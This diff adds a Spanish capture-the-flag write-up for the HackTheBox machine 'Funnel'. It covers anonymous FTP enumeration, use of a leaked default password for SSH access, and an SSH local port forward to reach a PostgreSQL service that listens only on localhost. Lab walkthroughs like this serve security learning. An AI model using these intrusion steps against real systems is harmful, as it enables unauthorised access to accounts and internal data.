@@ -1,0 +1,345 @@
+---
+titulo: "Funnel"
+plataforma: HackTheBox
+dificultad: Muy fácil
+so: Linux
+fecha: 2026-11-23
+tecnicas:
+  - Escaneo de puertos
+  - FTP
+  - Acceso anónimo
+  - Credenciales por defecto
+  - SSH
+  - Reenvío de puertos
+  - PostgreSQL
+resumen: "Máquina Linux con un FTP anónimo que filtra los usuarios y la contraseña por defecto de la empresa: con ella se entra por SSH y, con un túnel, se llega a un PostgreSQL que solo escucha en localhost y guarda la flag."
+serie:
+  nombre: Starting Point
+  tier: 1
+borrador: false
+---
+
+Máquina del Tier 1 de Starting Point. Las preguntas guiadas (tasks) de HackTheBox aparecen plegadas en la
+sección donde se responden: intenta contestarlas antes de abrirlas.
+
+<Ruta
+  titulo="Camino seguido en Funnel, de la conexión a la flag"
+  pasos={[
+    { titulo: 'nmap -sCV', detalle: 'FTP anónimo y SSH' },
+    { titulo: 'ftp', detalle: 'Usuarios y contraseña por defecto' },
+    { titulo: 'ssh', detalle: 'Entra christine' },
+    { titulo: 'ssh -L', detalle: 'Túnel al PostgreSQL local' },
+    { titulo: 'psql', detalle: 'Tabla flag en secrets', meta: true },
+  ]}
+/>
+
+> La IP `10.129.228.195` es la que tenía la máquina en mi sesión; a ti te saldrá otra.
+
+## Reconocimiento
+
+Lo primero es comprobar que llega la conexión con la máquina:
+
+<Cmd c="ping 10.129.228.195" notas={{ "10.129.228.195": "IP de la máquina objetivo." }} />
+
+Lo detengo con `Ctrl+C` y muestra el resumen:
+
+```text
+64 bytes from 10.129.228.195: icmp_seq=1 ttl=63 time=8.00 ms
+64 bytes from 10.129.228.195: icmp_seq=2 ttl=63 time=7.56 ms
+...
+^C
+--- 10.129.228.195 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3004ms
+```
+
+La máquina responde a todo: 4 paquetes enviados y 4 recibidos.
+
+## Enumeración
+
+### Puertos abiertos
+
+Busco los puertos abiertos, qué servicio y qué versión hay detrás de cada uno, y paso los scripts por
+defecto de nmap:
+
+<Cmd c="nmap -sCV --open 10.129.228.195" notas={{ "10.129.228.195": "IP de la máquina objetivo." }} />
+
+```text
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Hay dos puertos abiertos: el **21/tcp**, con el servidor FTP vsftpd 3.0.3, y el **22/tcp**, con OpenSSH
+8.2p1. El script `ftp-anon` ya avisa de que el FTP **admite el usuario anonymous** y de que hay un
+directorio, `mail_backup`.
+
+<Pista titulo="Tarea 1 · ¿Cuántos puertos TCP están abiertos?">
+  **2**.
+</Pista>
+
+### El FTP anónimo
+
+Me conecto al FTP con el usuario `anonymous` y listo lo que hay:
+
+<Cmd c="ftp 10.129.228.195" notas={{ "10.129.228.195": "IP de la máquina objetivo." }} />
+
+```text
+220 (vsFTPd 3.0.3)
+Name (10.129.228.195:root): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+ftp> dir
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
+226 Directory send OK.
+```
+
+<Pista titulo="Tarea 2 · ¿Cómo se llama el directorio disponible en el servidor FTP?">
+  **mail_backup**.
+</Pista>
+
+Entro en `mail_backup`, veo dos ficheros y los descargo a Pwnbox con `get`:
+
+```text
+ftp> cd mail_backup
+250 Directory successfully changed.
+ftp> dir
+-rw-r--r--    1 ftp      ftp         58899 Nov 28  2022 password_policy.pdf
+-rw-r--r--    1 ftp      ftp           713 Nov 28  2022 welcome_28112022
+ftp> get password_policy.pdf
+226 Transfer complete.
+ftp> get welcome_28112022
+226 Transfer complete.
+ftp> exit
+221 Goodbye.
+```
+
+### Los ficheros del backup
+
+`welcome_28112022` es un correo de bienvenida:
+
+<Cmd c="cat welcome_28112022" notas={{ "welcome_28112022": "Correo descargado del FTP." }} />
+
+```text
+Frome: root@funnel.htb
+To: optimus@funnel.htb albert@funnel.htb andreas@funnel.htb christine@funnel.htb maria@funnel.htb
+Subject:Welcome to the team!
+...
+We have set up your accounts that you will need to access our internal infrastracture. Please, read through the attached password policy with extreme care.
+All the steps mentioned there should be completed as soon as possible.
+```
+
+Da dos cosas: **cinco nombres de usuario** (optimus, albert, andreas, christine y maria) y la pista de que
+a todos se les han creado cuentas que deben configurar siguiendo la política de contraseñas adjunta.
+
+Esa política es `password_policy.pdf`. La abro con el visor de PDF de Pwnbox y en ella aparece la
+contraseña por defecto que reciben las cuentas nuevas, y que cada uno tendría que cambiar cuanto antes:
+`funnel123#!#`.
+
+<Pista titulo="Tarea 3 · ¿Cuál es la contraseña por defecto que todo miembro nuevo del equipo «Funnel» debería cambiar cuanto antes?">
+  **funnel123#!#**.
+</Pista>
+
+## Acceso inicial
+
+Si alguno de los cinco no ha cambiado la contraseña, podrá entrar por SSH con la de por defecto. Pruebo con
+christine:
+
+<Cmd c="ssh christine@10.129.228.195" notas={{ "christine@10.129.228.195": "Usuario christine (sacado del correo de bienvenida) en la máquina objetivo." }} />
+
+Al pedir la contraseña escribo `funnel123#!#` y entra:
+
+```text
+christine@10.129.228.195's password:
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
+...
+christine@funnel:~$
+```
+
+Así que christine es la usuaria que no había cambiado la contraseña por defecto.
+
+<Pista titulo="Tarea 4 · ¿Qué usuario no ha cambiado todavía su contraseña por defecto?">
+  **christine**.
+</Pista>
+
+### Qué hay dentro
+
+Compruebo con qué usuario y grupos estoy:
+
+<Cmd c="id" />
+
+```text
+uid=1000(christine) gid=1000(christine) groups=1000(christine)
+```
+
+Es un usuario normal, sin grupos especiales. Miro qué puertos TCP están escuchando en la máquina, en
+formato numérico:
+
+<Cmd c="ss -tln" />
+
+```text
+State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port
+LISTEN  0       4096         127.0.0.1:5432        0.0.0.0:*
+LISTEN  0       4096         127.0.0.1:33295       0.0.0.0:*
+LISTEN  0       4096     127.0.0.53%lo:53          0.0.0.0:*
+LISTEN  0       128            0.0.0.0:22          0.0.0.0:*
+LISTEN  0       32                   *:21                *:*
+LISTEN  0       128               [::]:22             [::]:*
+```
+
+Además del 21 y el 22 que ya vio nmap, hay servicios que **solo escuchan en `127.0.0.1`**, así que desde
+fuera no se ven. Para saber qué es el 5432, repito sin `-n`, y `ss` cambia los números de puerto por el
+nombre del servicio:
+
+<Cmd c="ss -tl" />
+
+```text
+State   Recv-Q  Send-Q   Local Address:Port        Peer Address:Port
+LISTEN  0       4096         127.0.0.1:postgresql       0.0.0.0:*
+...
+```
+
+En el 5432 está **PostgreSQL**, un servidor de bases de datos.
+
+<Pista titulo="Tarea 5 · ¿Qué servicio corre en el puerto TCP 5432 y escucha solo en localhost?">
+  **postgresql**.
+</Pista>
+
+### Un túnel hasta PostgreSQL
+
+Para hablar con PostgreSQL hace falta su cliente, `psql`, y en la máquina no está:
+
+```text
+christine@funnel:~$ psql
+
+Command 'psql' not found, but can be installed with:
+
+apt install postgresql-client-common
+Please ask your administrator.
+```
+
+Tampoco se puede instalar: christine no puede usar `apt` sin ser root y no está en sudoers.
+
+```text
+christine@funnel:~$ sudo apt install postgresql-client-common
+[sudo] password for christine:
+christine is not in the sudoers file.  This incident will be reported.
+```
+
+La solución es usar el `psql` de Pwnbox y llegar al puerto 5432 de la víctima a través de SSH, con un
+**reenvío de puerto local**: lo que entre por un puerto de mi equipo, SSH lo lleva por la conexión cifrada
+y lo entrega, ya desde la víctima, en `localhost:5432`.
+
+<Pista titulo="Tarea 6 · Como no puedes acceder a ese servicio desde la propia máquina, tendrás que crear un túnel y conectarte desde tu equipo. ¿Qué tipo de túnel hay que usar: remote port forwarding o local port forwarding?">
+  **local port forwarding** (reenvío de puerto local).
+</Pista>
+
+Abro el túnel desde Pwnbox:
+
+<Cmd
+  c="ssh -L 1234:localhost:5432 christine@10.129.228.195"
+  notas={{
+    "1234:localhost:5432": "Puerto 1234 de Pwnbox → localhost:5432 visto desde la víctima.",
+    "christine@10.129.228.195": "Usuario con la contraseña por defecto, en la máquina objetivo.",
+  }}
+/>
+
+El `localhost` de `1234:localhost:5432` se resuelve **en la víctima**, no en Pwnbox: por eso llega al
+PostgreSQL que solo escucha allí. La sesión SSH tiene que seguir abierta mientras se usa el túnel.
+
+### La base de datos
+
+Con el túnel abierto, en otro terminal de Pwnbox me conecto a mi propio puerto 1234 como christine, con la
+misma contraseña:
+
+<Cmd
+  c="psql -U christine -h localhost -p 1234"
+  notas={{
+    "christine": "Usuario de PostgreSQL.",
+    "localhost": "Pwnbox: el túnel escucha aquí.",
+    "1234": "Puerto local del túnel.",
+  }}
+/>
+
+```text
+Password for user christine:
+psql (17.9 (Debian 17.9-0+deb13u1), server 15.1 (Debian 15.1-1.pgdg110+1))
+Type "help" for help.
+
+christine=#
+```
+
+Dentro de `psql`, los metacomandos empiezan por `\`. Con `\l` listo las bases de datos:
+
+```text
+christine=# \l
+   Name    |   Owner   | Encoding | ...
+-----------+-----------+----------+----
+ christine | christine | UTF8     |
+ postgres  | christine | UTF8     |
+ secrets   | christine | UTF8     |
+ template0 | christine | UTF8     |
+ template1 | christine | UTF8     |
+(5 rows)
+```
+
+`postgres`, `template0` y `template1` son las que trae PostgreSQL y `christine` es la del propio usuario.
+La que llama la atención es **secrets**. Me conecto a ella con `\c` y listo sus tablas con `\dt`:
+
+```text
+christine=# \c secrets
+You are now connected to database "secrets" as user "christine".
+secrets=# \dt
+         List of relations
+ Schema | Name | Type  |   Owner
+--------+------+-------+-----------
+ public | flag | table | christine
+(1 row)
+```
+
+Hay una tabla `flag`. La leo con una consulta SQL:
+
+```text
+secrets=# SELECT * FROM flag;
+```
+
+La flag no se publica: la tienes que conseguir tú.
+
+<Pista titulo="Tarea 7 · ¿Cómo se llama la base de datos que guarda la flag?">
+  **secrets**.
+</Pista>
+
+<Pista titulo="Tarea 8 · ¿Podrías usar un túnel dinámico en lugar del reenvío de puerto local? Sí o no.">
+  **Sí** (respuesta en HTB: `Yes`). Con `ssh -D` se abre un proxy SOCKS en un puerto local y por él se
+  puede llegar al 5432 de la víctima. Yo usé el reenvío local, así que esto no lo probé.
+</Pista>
+
+<Pista titulo="Flag · Envía la flag que está en la base de datos">
+  Está en la tabla `flag` de la base de datos `secrets`. Llega a ella con `psql` a través del túnel.
+</Pista>
+
+## Escalada de privilegios
+
+No hace falta: la flag está en una base de datos a la que christine ya tiene acceso, así que el objetivo se
+cumple con el acceso inicial y el túnel, sin subir de usuario.
+
+## Lecciones aprendidas
+
+- **Qué fallé:** primero quise comprobar los cinco usuarios con hydra, pero escribí `hyda` y luego puse la
+  IP entre llaves (`{10.129.228.195}`), que hydra no sabe resolver. Al final probé christine por SSH a mano.
+  Después intenté usar e instalar `psql` en la propia víctima, cuando christine no es sudoer. Y con los
+  túneles me lié: me equivoqué dos veces de contraseña, abrí uno al 8080 y otro al 1234 y me conectaba al
+  puerto que no estaba abierto en ese momento.
+- **Lo que enseña la máquina:** dejar una contraseña por defecto en un FTP anónimo es dar la llave a
+  cualquiera, y basta con que un solo usuario no la cambie. Además, un servicio que solo escucha en
+  localhost no está protegido si se puede entrar por SSH: un túnel lo saca fuera.
+- **Qué haré la próxima vez:** revisar el comando antes de lanzarlo (nombre y objetivo sin adornos), usar
+  las herramientas de mi equipo a través de un túnel en vez de intentar instalarlas en la víctima, y tener
+  claro qué túnel está abierto y en qué puerto antes de conectarme.
+
+{/* Redactado por Claude a partir de tus apuntes; revisa sobre todo las frases de "Lecciones aprendidas". */}
